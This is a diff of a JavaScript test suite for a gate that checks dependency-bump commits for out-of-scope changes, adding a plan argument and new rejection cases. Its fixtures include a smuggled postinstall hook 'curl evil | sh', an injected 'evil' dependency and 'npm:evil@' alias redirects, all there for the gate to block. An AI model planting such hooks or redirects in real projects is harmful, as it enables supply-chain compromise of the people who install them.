@@ -109,7 +109,7 @@ test("checkBumpScope passes a legal npm-style bump (member version moved, lockfi
   });
   writeInto(repo, "package.json", JSON.stringify({ dependencies: { "left-pad": "^1.3.0" } }));
   writeInto(repo, "package-lock.json", JSON.stringify({ lockfileVersion: 3, refreshed: true }));
-  assert.deepEqual(checkBumpScope(repo, "HEAD", [{ name: "left-pad", latest: "1.3.0" }]), {
+  assert.deepEqual(checkBumpScope(repo, "HEAD", [{ name: "left-pad", latest: "1.3.0" }], []), {
     ok: true,
     violations: [],
   });
@@ -130,7 +130,7 @@ test("checkBumpScope denies a scripts change smuggled alongside the bump", () =>
       scripts: { build: "tsc", postinstall: "curl evil | sh" },
     }),
   );
-  const scope = checkBumpScope(repo, "HEAD", [{ name: "left-pad", latest: "1.3.0" }]);
+  const scope = checkBumpScope(repo, "HEAD", [{ name: "left-pad", latest: "1.3.0" }], []);
   assert.equal(scope.ok, false);
   assert.deepEqual(scope.violations, ["package.json#scripts"]);
 });
@@ -144,7 +144,7 @@ test("checkBumpScope denies an added dependency key", () => {
     "package.json",
     JSON.stringify({ dependencies: { "left-pad": "^1.3.0", evil: "*" } }),
   );
-  const scope = checkBumpScope(repo, "HEAD", [{ name: "left-pad", latest: "1.3.0" }]);
+  const scope = checkBumpScope(repo, "HEAD", [{ name: "left-pad", latest: "1.3.0" }], []);
   assert.equal(scope.ok, false);
   assert.deepEqual(scope.violations, ["package.json#dependencies.evil"]);
 });
@@ -158,7 +158,7 @@ test("checkBumpScope denies a non-member version change", () => {
     "package.json",
     JSON.stringify({ dependencies: { "left-pad": "^1.3.0", chalk: "^5.0.0" } }),
   );
-  const scope = checkBumpScope(repo, "HEAD", [{ name: "left-pad", latest: "1.3.0" }]);
+  const scope = checkBumpScope(repo, "HEAD", [{ name: "left-pad", latest: "1.3.0" }], []);
   assert.equal(scope.ok, false);
   assert.deepEqual(scope.violations, ["package.json#dependencies.chalk"]);
 });
@@ -168,7 +168,7 @@ test("checkBumpScope denies a member value that does not carry latest", () => {
     "package.json": JSON.stringify({ dependencies: { "left-pad": "^1.0.0" } }),
   });
   writeInto(repo, "package.json", JSON.stringify({ dependencies: { "left-pad": "^1.2.9" } }));
-  const scope = checkBumpScope(repo, "HEAD", [{ name: "left-pad", latest: "1.3.0" }]);
+  const scope = checkBumpScope(repo, "HEAD", [{ name: "left-pad", latest: "1.3.0" }], []);
   assert.equal(scope.ok, false);
   assert.deepEqual(scope.violations, ["package.json#dependencies.left-pad"]);
 });
@@ -180,7 +180,7 @@ test("checkBumpScope denies a de-catalog (catalog: reference rewritten to a plai
   // A de-catalog carries latest, but the OLD value was a catalog: reference, so
   // it is still a violation (the executor's mistaken de-catalog vector).
   writeInto(repo, "package.json", JSON.stringify({ dependencies: { semver: "7.7.3" } }));
-  const scope = checkBumpScope(repo, "HEAD", [{ name: "semver", latest: "7.7.3" }]);
+  const scope = checkBumpScope(repo, "HEAD", [{ name: "semver", latest: "7.7.3" }], []);
   assert.equal(scope.ok, false);
   assert.deepEqual(scope.violations, ["package.json#dependencies.semver"]);
 });
@@ -190,7 +190,7 @@ test("checkBumpScope denies a newly created package.json (install script plantin
     "package.json": JSON.stringify({ dependencies: { "left-pad": "^1.0.0" } }),
   });
   writeInto(repo, "packages/evil/package.json", JSON.stringify({ scripts: { postinstall: "x" } }));
-  const scope = checkBumpScope(repo, "HEAD", [{ name: "left-pad", latest: "1.3.0" }]);
+  const scope = checkBumpScope(repo, "HEAD", [{ name: "left-pad", latest: "1.3.0" }], []);
   assert.equal(scope.ok, false);
   assert.deepEqual(scope.violations, ["packages/evil/package.json (new)"]);
 });
@@ -200,7 +200,7 @@ test("checkBumpScope denies an unparseable package.json", () => {
     "package.json": JSON.stringify({ dependencies: { "left-pad": "^1.0.0" } }),
   });
   writeInto(repo, "package.json", "{ not json");
-  const scope = checkBumpScope(repo, "HEAD", [{ name: "left-pad", latest: "1.3.0" }]);
+  const scope = checkBumpScope(repo, "HEAD", [{ name: "left-pad", latest: "1.3.0" }], []);
   assert.equal(scope.ok, false);
   assert.deepEqual(scope.violations, ["package.json (unparseable)"]);
 });
@@ -212,19 +212,29 @@ test("checkBumpScope passes a legal pnpm-workspace.yaml catalog move (default + 
   });
   writeInto(repo, "pnpm-workspace.yaml", "packages:\n  - packages/*\ncatalog:\n  semver: ^7.7.3\n");
   writeInto(repo, "pnpm-lock.yaml", "lockfileVersion: '9.0'\nrefreshed: true\n");
-  assert.deepEqual(checkBumpScope(repo, "HEAD", [{ name: "semver", latest: "7.7.3" }]), {
-    ok: true,
-    violations: [],
-  });
+  assert.deepEqual(
+    checkBumpScope(
+      repo,
+      "HEAD",
+      [{ name: "semver", latest: "7.7.3" }],
+      [{ name: "semver", target: "7.7.3", catalog: null }],
+    ),
+    { ok: true, violations: [] },
+  );
 });
 
 test("checkBumpScope passes a named-catalog member move", () => {
   const repo = bumpRepo({ "pnpm-workspace.yaml": "catalogs:\n  react:\n    react: ^18.0.0\n" });
   writeInto(repo, "pnpm-workspace.yaml", "catalogs:\n  react:\n    react: ^19.0.0\n");
-  assert.deepEqual(checkBumpScope(repo, "HEAD", [{ name: "react", latest: "19.0.0" }]), {
-    ok: true,
-    violations: [],
-  });
+  assert.deepEqual(
+    checkBumpScope(
+      repo,
+      "HEAD",
+      [{ name: "react", latest: "19.0.0" }],
+      [{ name: "react", target: "19.0.0", catalog: "react" }],
+    ),
+    { ok: true, violations: [] },
+  );
 });
 
 test("checkBumpScope denies non-catalog pnpm-workspace.yaml changes (packages / onlyBuiltDependencies)", () => {
@@ -236,7 +246,12 @@ test("checkBumpScope denies non-catalog pnpm-workspace.yaml changes (packages / 
     "pnpm-workspace.yaml",
     "packages:\n  - packages/*\n  - tools/*\ncatalog:\n  semver: ^7.7.3\nonlyBuiltDependencies:\n  - esbuild\n",
   );
-  const scope = checkBumpScope(repo, "HEAD", [{ name: "semver", latest: "7.7.3" }]);
+  const scope = checkBumpScope(
+    repo,
+    "HEAD",
+    [{ name: "semver", latest: "7.7.3" }],
+    [{ name: "semver", target: "7.7.3", catalog: null }],
+  );
   assert.equal(scope.ok, false);
   assert.deepEqual(scope.violations.sort(), [
     "pnpm-workspace.yaml#onlyBuiltDependencies",
@@ -244,11 +259,81 @@ test("checkBumpScope denies non-catalog pnpm-workspace.yaml changes (packages / 
   ]);
 });
 
+test("checkBumpScope denies an alias redirect that carries the target version", () => {
+  const repo = bumpRepo({
+    "package.json": JSON.stringify({ dependencies: { "left-pad": "^1.0.0" } }),
+  });
+  // `npm:evil@1.3.0` contains the vetted "1.3.0" but redirects the dependency
+  // to a different package — the strict whole-string grammar must reject it
+  // (and with it every git:/file:/link:/URL specifier).
+  writeInto(
+    repo,
+    "package.json",
+    JSON.stringify({ dependencies: { "left-pad": "npm:evil@1.3.0" } }),
+  );
+  const scope = checkBumpScope(repo, "HEAD", [{ name: "left-pad", latest: "1.3.0" }], []);
+  assert.equal(scope.ok, false);
+  assert.deepEqual(scope.violations, ["package.json#dependencies.left-pad"]);
+});
+
+test("checkBumpScope denies a compound range even when it contains the target", () => {
+  const repo = bumpRepo({
+    "package.json": JSON.stringify({ dependencies: { "left-pad": "^1.0.0" } }),
+  });
+  // Only the exact/caret/tilde shapes the PM commands write are legal; an
+  // exotic range fails closed rather than widening the grammar.
+  writeInto(repo, "package.json", JSON.stringify({ dependencies: { "left-pad": ">=1.3.0 <2" } }));
+  const scope = checkBumpScope(repo, "HEAD", [{ name: "left-pad", latest: "1.3.0" }], []);
+  assert.equal(scope.ok, false);
+  assert.deepEqual(scope.violations, ["package.json#dependencies.left-pad"]);
+});
+
+test("checkBumpScope denies a change in a catalog the plan did not target", () => {
+  const repo = bumpRepo({
+    "pnpm-workspace.yaml": "catalog:\n  semver: ^7.3.0\ncatalogs:\n  legacy:\n    semver: ^7.3.0\n",
+  });
+  // The plan edited only the default catalog; the same-named entry in the
+  // unreferenced `legacy` catalog changed too (an alias redirect, even) — that
+  // is not the executor's write and must be a violation.
+  writeInto(
+    repo,
+    "pnpm-workspace.yaml",
+    "catalog:\n  semver: ^7.7.3\ncatalogs:\n  legacy:\n    semver: npm:evil@7.7.3\n",
+  );
+  const scope = checkBumpScope(
+    repo,
+    "HEAD",
+    [{ name: "semver", latest: "7.7.3" }],
+    [{ name: "semver", target: "7.7.3", catalog: null }],
+  );
+  assert.equal(scope.ok, false);
+  assert.deepEqual(scope.violations, ["pnpm-workspace.yaml#catalogs.legacy.semver"]);
+});
+
+test("checkBumpScope allows a default-catalog edit landing in catalogs.default", () => {
+  const repo = bumpRepo({
+    "pnpm-workspace.yaml": "catalogs:\n  default:\n    semver: ^7.3.0\n",
+  });
+  // pnpm treats `catalog:` as sugar for `catalog:default`, and the executor
+  // resolves a default edit to catalogs.default when no top-level catalog map
+  // exists — the gate must accept the same landing spot.
+  writeInto(repo, "pnpm-workspace.yaml", "catalogs:\n  default:\n    semver: ^7.7.3\n");
+  assert.deepEqual(
+    checkBumpScope(
+      repo,
+      "HEAD",
+      [{ name: "semver", latest: "7.7.3" }],
+      [{ name: "semver", target: "7.7.3", catalog: null }],
+    ),
+    { ok: true, violations: [] },
+  );
+});
+
 test("checkBumpScope denies an unparseable pnpm-workspace.yaml", () => {
   const repo = bumpRepo({ "pnpm-workspace.yaml": "catalog:\n  semver: ^7.3.0\n" });
   // A YAML sequence root is not a plain map → illegible → fail-closed.
   writeInto(repo, "pnpm-workspace.yaml", "- just\n- a\n- list\n");
-  const scope = checkBumpScope(repo, "HEAD", [{ name: "semver", latest: "7.7.3" }]);
+  const scope = checkBumpScope(repo, "HEAD", [{ name: "semver", latest: "7.7.3" }], []);
   assert.equal(scope.ok, false);
   assert.deepEqual(scope.violations, ["pnpm-workspace.yaml (unparseable)"]);
 });
